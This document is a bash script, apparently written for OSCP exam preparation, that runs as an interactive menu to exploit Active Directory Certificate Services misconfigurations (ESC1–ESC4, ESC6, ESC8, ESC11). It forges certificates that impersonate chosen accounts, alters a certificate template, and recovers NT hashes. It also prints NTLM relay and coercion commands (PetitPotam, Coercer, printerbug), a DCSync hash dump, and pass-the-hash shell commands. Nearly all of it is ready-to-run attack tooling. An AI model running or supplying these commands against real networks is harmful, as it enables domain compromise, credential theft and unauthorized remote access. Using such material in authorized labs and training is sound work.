#!/bin/bash
# ============================================================
#  ADCS Attack Script for OSCP
#  Covers: ESC1, ESC2, ESC3, ESC4, ESC6, ESC8, ESC11
#  Primary tool: Certipy (pip install certipy-ad)
#  Secondary:    Certify.exe (Windows), impacket, PKINITtools
#
#  Usage:
#    chmod +x adcs_oscp.sh
#    ./adcs_oscp.sh
#  Then follow the numbered menu prompts.
# ============================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

banner() {
    echo -e "${CYAN}${BOLD}"
    echo "  ╔═══════════════════════════════════════════╗"
    echo "  ║        ADCS OSCP Attack Script            ║"
    echo "  ║   ESC1 ESC2 ESC3 ESC4 ESC6 ESC8 ESC11    ║"
    echo "  ╚═══════════════════════════════════════════╝"
    echo -e "${NC}"
}

# ─────────────────────────────────────────────
# CONFIGURATION  – edit before running
# ─────────────────────────────────────────────
DC_IP=""
DOMAIN=""
USERNAME=""
PASSWORD=""
CA_NAME=""          # e.g.  "corp.local\CORP-CA"
TEMPLATE=""         # vulnerable template name (ESC1/2/3/4)
TARGET_UPN=""       # e.g.  "administrator@corp.local"
LHOST=""            # your attack IP (needed for ESC8 relay)

prompt_config() {
    echo -e "${YELLOW}[*] Enter lab/target details (leave blank to skip)${NC}"
    read -rp "  DC IP       : " DC_IP
    read -rp "  Domain      : " DOMAIN
    read -rp "  Username    : " USERNAME
    read -rsp "  Password    : " PASSWORD; echo
    read -rp "  CA Name     : " CA_NAME
    read -rp "  Your IP     : " LHOST
}

check_tool() {
    if ! command -v "$1" &>/dev/null; then
        echo -e "${RED}[-] '$1' not found. Install with: $2${NC}"
        return 1
    fi
    return 0
}

# ─────────────────────────────────────────────
# 0. ENUMERATION
# ─────────────────────────────────────────────
enum_all() {
    echo -e "\n${GREEN}[+] ENUMERATION – Finding all ADCS misconfigurations${NC}"
    check_tool certipy "pip install certipy-ad" || return

    echo -e "${CYAN}[*] Full find (saves JSON + TXT + BloodHound zip)${NC}"
    certipy find \
        -u "${USERNAME}@${DOMAIN}" \
        -p "${PASSWORD}" \
        -dc-ip "${DC_IP}" \
        -stdout

    echo -e "\n${CYAN}[*] Vulnerable-only quick view${NC}"
    certipy find \
        -u "${USERNAME}@${DOMAIN}" \
        -p "${PASSWORD}" \
        -dc-ip "${DC_IP}" \
        -vulnerable \
        -stdout

    echo -e "\n${CYAN}[*] NetExec SMB CA enum (alternative)${NC}"
    if check_tool nxc "apt install netexec" 2>/dev/null; then
        nxc smb "${DC_IP}" \
            -u "${USERNAME}" \
            -p "${PASSWORD}" \
            -M enum_ca
    fi
}

# ─────────────────────────────────────────────
# 1. ESC1 – Arbitrary SAN in certificate request
#    Requirements:
#      • Template allows CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
#      • Client Authentication EKU present
#      • Low-priv users have Enroll rights
# ─────────────────────────────────────────────
esc1() {
    echo -e "\n${GREEN}[+] ESC1 – Arbitrary Subject Alternative Name${NC}"
    read -rp "  Template name  : " TEMPLATE
    read -rp "  Target UPN     : " TARGET_UPN

    echo -e "${CYAN}[*] Requesting certificate as ${TARGET_UPN}${NC}"
    certipy req \
        -u "${USERNAME}@${DOMAIN}" \
        -p "${PASSWORD}" \
        -ca "${CA_NAME}" \
        -template "${TEMPLATE}" \
        -upn "${TARGET_UPN}" \
        -dc-ip "${DC_IP}"

    local pfx_file
    pfx_file=$(ls -t ./*.pfx 2>/dev/null | head -1)
    if [[ -z "$pfx_file" ]]; then
        echo -e "${RED}[-] No .pfx found – request may have failed${NC}"
        return
    fi

    echo -e "${CYAN}[*] Authenticating with certificate: ${pfx_file}${NC}"
    certipy auth \
        -pfx "${pfx_file}" \
        -dc-ip "${DC_IP}" \
        -domain "${DOMAIN}"

    echo -e "${GREEN}[+] NT hash recovered. Use with Pass-the-Hash or impacket tools.${NC}"
    echo -e "    e.g.  impacket-secretsdump -hashes :<NTHASH> ${TARGET_UPN%%@*}@${DC_IP}"
}

# ─────────────────────────────────────────────
# 2. ESC2 – Any Purpose / No EKU template
#    Requirements:
#      • Template has "Any Purpose" EKU or no EKU
#      • Low-priv users have Enroll rights
#    Pivot: use the cert as an enrollment agent → then ESC3
# ─────────────────────────────────────────────
esc2() {
    echo -e "\n${GREEN}[+] ESC2 – Any Purpose / No EKU template${NC}"
    read -rp "  Template name  : " TEMPLATE

    echo -e "${CYAN}[*] Requesting Any-Purpose certificate${NC}"
    certipy req \
        -u "${USERNAME}@${DOMAIN}" \
        -p "${PASSWORD}" \
        -ca "${CA_NAME}" \
        -template "${TEMPLATE}" \
        -dc-ip "${DC_IP}"

    echo -e "${YELLOW}[!] Use resulting .pfx as enrollment agent cert in ESC3 pivot${NC}"
    echo -e "    Next step: run option 3 (ESC3) with this .pfx"
}

# ─────────────────────────────────────────────
# 3. ESC3 – Enrollment Agent abuse
#    Requirements:
#      • Certificate Request Agent EKU template (step A)
#      • A second template with "Certificate Request Agent"
#        application policy and Enroll rights (step B)
# ─────────────────────────────────────────────
esc3() {
    echo -e "\n${GREEN}[+] ESC3 – Enrollment Agent / Certificate Request Agent${NC}"

    # Step A: get enrollment agent cert
    read -rp "  Enrollment Agent template : " EA_TEMPLATE
    echo -e "${CYAN}[*] Step A: Request Enrollment Agent certificate${NC}"
    certipy req \
        -u "${USERNAME}@${DOMAIN}" \
        -p "${PASSWORD}" \
        -ca "${CA_NAME}" \
        -template "${EA_TEMPLATE}" \
        -dc-ip "${DC_IP}"

    local ea_pfx
    ea_pfx=$(ls -t ./*.pfx 2>/dev/null | head -1)
    echo -e "${GREEN}[+] Enrollment Agent cert: ${ea_pfx}${NC}"

    # Step B: use agent cert to enroll on behalf of target
    read -rp "  Second template (on-behalf) : " OBO_TEMPLATE
    read -rp "  Target UPN                  : " TARGET_UPN
    echo -e "${CYAN}[*] Step B: Enroll on behalf of ${TARGET_UPN}${NC}"
    certipy req \
        -u "${USERNAME}@${DOMAIN}" \
        -p "${PASSWORD}" \
        -ca "${CA_NAME}" \
        -template "${OBO_TEMPLATE}" \
        -on-behalf-of "${TARGET_UPN}" \
        -pfx "${ea_pfx}" \
        -dc-ip "${DC_IP}"

    local pfx_file
    pfx_file=$(ls -t ./*.pfx 2>/dev/null | head -1)
    echo -e "${CYAN}[*] Authenticating with impersonated cert${NC}"
    certipy auth \
        -pfx "${pfx_file}" \
        -dc-ip "${DC_IP}" \
        -domain "${DOMAIN}"
}

# ─────────────────────────────────────────────
# 4. ESC4 – Writable template (GenericWrite/Owner)
#    Requirements:
#      • Attacker has write perms on a cert template AD object
#    Attack: modify template to be ESC1-vulnerable, exploit, restore
# ─────────────────────────────────────────────
esc4() {
    echo -e "\n${GREEN}[+] ESC4 – Vulnerable Template ACL (GenericWrite)${NC}"
    read -rp "  Template name  : " TEMPLATE
    read -rp "  Target UPN     : " TARGET_UPN

    echo -e "${CYAN}[*] Overwriting template to allow SAN supply (ESC1 conditions)${NC}"
    certipy template \
        -u "${USERNAME}@${DOMAIN}" \
        -p "${PASSWORD}" \
        -template "${TEMPLATE}" \
        -save-old \
        -dc-ip "${DC_IP}"

    echo -e "${CYAN}[*] Requesting certificate with arbitrary UPN${NC}"
    certipy req \
        -u "${USERNAME}@${DOMAIN}" \
        -p "${PASSWORD}" \
        -ca "${CA_NAME}" \
        -template "${TEMPLATE}" \
        -upn "${TARGET_UPN}" \
        -dc-ip "${DC_IP}"

    local pfx_file
    pfx_file=$(ls -t ./*.pfx 2>/dev/null | head -1)

    echo -e "${CYAN}[*] Restoring original template configuration${NC}"
    certipy template \
        -u "${USERNAME}@${DOMAIN}" \
        -p "${PASSWORD}" \
        -template "${TEMPLATE}" \
        -configuration "${TEMPLATE}.json" \
        -dc-ip "${DC_IP}"

    echo -e "${CYAN}[*] Authenticating${NC}"
    certipy auth \
        -pfx "${pfx_file}" \
        -dc-ip "${DC_IP}" \
        -domain "${DOMAIN}"
}

# ─────────────────────────────────────────────
# 5. ESC6 – CA flag EDITF_ATTRIBUTESUBJECTALTNAME2
#    Requirements:
#      • CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set
#      • Any template with Client Auth EKU becomes ESC1-vulnerable
# ─────────────────────────────────────────────
esc6() {
    echo -e "\n${GREEN}[+] ESC6 – CA-level SAN flag (EDITF_ATTRIBUTESUBJECTALTNAME2)${NC}"
    echo -e "${CYAN}[*] Checking CA flags via certutil (run on Windows or via Certipy find)${NC}"
    echo "    certutil -config \"${CA_NAME}\" -getreg \"policy\\EditFlags\""
    echo "    Look for: EDITF_ATTRIBUTESUBJECTALTNAME2"

    read -rp "  Template with Client Auth EKU : " TEMPLATE
    read -rp "  Target UPN                    : " TARGET_UPN

    echo -e "${CYAN}[*] Requesting certificate with SAN (works because of CA flag)${NC}"
    certipy req \
        -u "${USERNAME}@${DOMAIN}" \
        -p "${PASSWORD}" \
        -ca "${CA_NAME}" \
        -template "${TEMPLATE}" \
        -upn "${TARGET_UPN}" \
        -dc-ip "${DC_IP}"

    local pfx_file
    pfx_file=$(ls -t ./*.pfx 2>/dev/null | head -1)
    certipy auth \
        -pfx "${pfx_file}" \
        -dc-ip "${DC_IP}" \
        -domain "${DOMAIN}"
}

# ─────────────────────────────────────────────
# 6. ESC8 – NTLM Relay to ADCS HTTP Web Enrollment
#    Requirements:
#      • ADCS Web Enrollment (/certsrv) enabled over HTTP
#      • NTLM auth not hardened (no EPA / no HTTPS forced)
#    Steps:
#      1. Start Certipy relay listener
#      2. Coerce DC auth with PetitPotam / Coercer / printerbug
#      3. Relay DC$ machine account → get DC cert
#      4. Auth as DC$ → DCSync
# ─────────────────────────────────────────────
esc8() {
    echo -e "\n${GREEN}[+] ESC8 – NTLM Relay to Web Enrollment (HTTP)${NC}"
    echo -e "${YELLOW}[!] Run Steps A and B in SEPARATE terminals${NC}"

    local CA_IP
    read -rp "  CA/Web Enrollment IP  : " CA_IP
    read -rp "  DC IP (to coerce)     : " DC_IP_TARGET

    echo ""
    echo -e "${CYAN}─── TERMINAL 1: Start Certipy relay ───────────────────────${NC}"
    echo "  certipy relay -ca ${CA_IP} -template DomainController"
    echo ""
    echo -e "${CYAN}─── TERMINAL 2: Coerce DC authentication ──────────────────${NC}"
    echo "  # Option A – PetitPotam (unauthenticated on unpatched):"
    echo "  python3 PetitPotam.py -d ${DOMAIN} ${LHOST} ${DC_IP_TARGET}"
    echo ""
    echo "  # Option B – Coercer (multiple coercion methods):"
    echo "  coercer coerce -l ${LHOST} -t ${DC_IP_TARGET} -u ${USERNAME} -p '${PASSWORD}' -d ${DOMAIN}"
    echo ""
    echo "  # Option C – PrinterBug / SpoolSample:"
    echo "  python3 printerbug.py ${DOMAIN}/${USERNAME}:'${PASSWORD}'@${DC_IP_TARGET} ${LHOST}"
    echo ""
    echo -e "${CYAN}─── After relay succeeds ───────────────────────────────────${NC}"
    echo "  # Authenticate as DC machine account using obtained .pfx:"
    echo "  certipy auth -pfx <DC_HOSTNAME>.pfx -dc-ip ${DC_IP_TARGET} -domain ${DOMAIN}"
    echo ""
    echo "  # DCSync with the DC's NT hash:"
    echo "  impacket-secretsdump -hashes :<DC_NTHASH> '${DOMAIN}/DC\$'@${DC_IP_TARGET}"

    read -rp $'\n  Press ENTER once relay has captured a cert to authenticate...'

    local pfx_file
    pfx_file=$(ls -t ./*.pfx 2>/dev/null | head -1)
    if [[ -n "$pfx_file" ]]; then
        echo -e "${CYAN}[*] Authenticating with: ${pfx_file}${NC}"
        certipy auth \
            -pfx "${pfx_file}" \
            -dc-ip "${DC_IP_TARGET}" \
            -domain "${DOMAIN}"
    else
        echo -e "${RED}[-] No .pfx found in current directory${NC}"
    fi
}

# ─────────────────────────────────────────────
# 7. ESC11 – NTLM Relay to ICPR (RPC) interface
#    Requirements:
#      • CA has IF_ENFORCEENCRYPTICERTREQUEST cleared (0x0)
#      • Coerce auth of a privileged machine account
# ─────────────────────────────────────────────
esc11() {
    echo -e "\n${GREEN}[+] ESC11 – NTLM Relay to ICPR/RPC (no HTTPS needed)${NC}"

    local CA_IP
    read -rp "  CA IP                 : " CA_IP
    read -rp "  DC IP (to coerce)     : " DC_IP_TARGET
    read -rp "  Template name         : " TEMPLATE

    echo -e "${CYAN}[*] Verify CA flag (should return 0x0 to be vulnerable):${NC}"
    echo "    certutil -config '${CA_NAME}' -getreg CA\\InterfaceFlags"
    echo "    0x0 = vulnerable | 0x200 = hardened"
    echo ""
    echo -e "${CYAN}─── TERMINAL 1: Start Certipy ICPR relay ──────────────────${NC}"
    echo "  certipy relay -ca ${CA_IP} -template ${TEMPLATE} -target-port 135"
    echo ""
    echo -e "${CYAN}─── TERMINAL 2: Coerce authentication ─────────────────────${NC}"
    echo "  coercer coerce -l ${LHOST} -t ${DC_IP_TARGET} -u ${USERNAME} -p '${PASSWORD}' -d ${DOMAIN}"
    echo ""
    echo -e "${CYAN}─── Post-relay ─────────────────────────────────────────────${NC}"
    echo "  certipy auth -pfx <obtained>.pfx -dc-ip ${DC_IP_TARGET} -domain ${DOMAIN}"
}

# ─────────────────────────────────────────────
# 8. POST-EXPLOITATION helpers
# ─────────────────────────────────────────────
post_exploit() {
    echo -e "\n${GREEN}[+] Post-Exploitation: Certificate → NT Hash → Domain Access${NC}"
    local pfx_file nt_hash target
    read -rp "  Path to .pfx file  : " pfx_file
    read -rp "  Target account UPN : " target

    echo -e "\n${CYAN}[*] Auth via PKINIT to recover NT hash (unPAC-the-hash)${NC}"
    certipy auth \
        -pfx "${pfx_file}" \
        -dc-ip "${DC_IP}" \
        -domain "${DOMAIN}"

    echo -e "\n${CYAN}[*] Common follow-up commands (fill in NT hash from above):${NC}"
    echo "  # Dump all domain hashes (DCSync):"
    echo "  impacket-secretsdump -hashes :<NTHASH> ${DOMAIN}/${target%%@*}@${DC_IP}"
    echo ""
    echo "  # WinRM shell:"
    echo "  evil-winrm -i ${DC_IP} -u ${target%%@*} -H <NTHASH>"
    echo ""
    echo "  # SMB exec:"
    echo "  impacket-psexec -hashes :<NTHASH> ${DOMAIN}/${target%%@*}@${DC_IP}"
}

# ─────────────────────────────────────────────
# MAIN MENU
# ─────────────────────────────────────────────
main_menu() {
    banner
    prompt_config

    while true; do
        echo -e "\n${BOLD}═══ ADCS Attack Menu ═══════════════════════════════════════${NC}"
        echo "  0  Enumerate ALL ADCS misconfigurations (Certipy find)"
        echo "  1  ESC1  – Arbitrary SAN (supply own UPN/SAN)"
        echo "  2  ESC2  – Any-Purpose / No-EKU template"
        echo "  3  ESC3  – Enrollment Agent abuse"
        echo "  4  ESC4  – Writable template ACL (GenericWrite)"
        echo "  5  ESC6  – CA flag EDITF_ATTRIBUTESUBJECTALTNAME2"
        echo "  6  ESC8  – NTLM Relay → Web Enrollment (HTTP)"
        echo "  7  ESC11 – NTLM Relay → ICPR/RPC interface"
        echo "  8  Post-exploitation helpers (.pfx → hash → shell)"
        echo "  9  Re-enter credentials / config"
        echo "  q  Quit"
        echo -e "${BOLD}═════════════════════════════════════════════════════════════${NC}"
        read -rp "  Choice: " choice

        case "$choice" in
            0) enum_all ;;
            1) esc1 ;;
            2) esc2 ;;
            3) esc3 ;;
            4) esc4 ;;
            5) esc6 ;;
            6) esc8 ;;
            7) esc11 ;;
            8) post_exploit ;;
            9) prompt_config ;;
            q|Q) echo -e "\n${GREEN}[+] Goodbye!${NC}"; exit 0 ;;
            *) echo -e "${RED}[-] Invalid choice${NC}" ;;
        esac
    done
}

main_menu
